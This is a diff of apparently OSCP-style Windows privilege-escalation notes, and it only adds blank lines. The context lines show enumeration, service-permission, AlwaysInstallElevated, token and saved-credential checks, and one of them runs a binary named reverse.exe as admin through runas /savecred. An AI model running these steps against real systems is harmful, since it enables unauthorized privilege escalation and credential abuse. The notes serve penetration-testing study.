@@ -1,4 +1,5 @@
 1. Quick Enumeration
+   
 whoami /all
 systeminfo
 net users
@@ -17,6 +18,7 @@ winPEAS, privilege escalation
 
 
 2. Kernel Exploits
+
 Check OS version and missing patches:
 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
@@ -33,6 +35,7 @@ Windows exploit suggester OSCP
 
 
 3. Service Exploits
+   
 Insecure Permissions
 sc qc <service_name>
 .\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
@@ -61,6 +64,7 @@ Insecure service permissions Windows privesc site:reddit.com
 
 
 4. AlwaysInstallElevated
+   
 Check both registry keys:
 
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -82,6 +86,7 @@ AlwaysInstallElevated privilege escalation
 
 
 5. Token Impersonation
+   
 Check for:
 
 whoami /priv
@@ -104,6 +109,7 @@ PrintSpoofer, privilege escalation
 
 
 6. Password Hunting
+   
 Saved Credentials
 cmdkey /list
 runas /savecred /user:admin "C:\PrivEsc\reverse.exe"
@@ -128,6 +134,7 @@ Windows password hunting privesc
 
 
 7. Scheduled Tasks & Startup
+   
 Scheduled Tasks
 schtasks /query /fo LIST /v
 
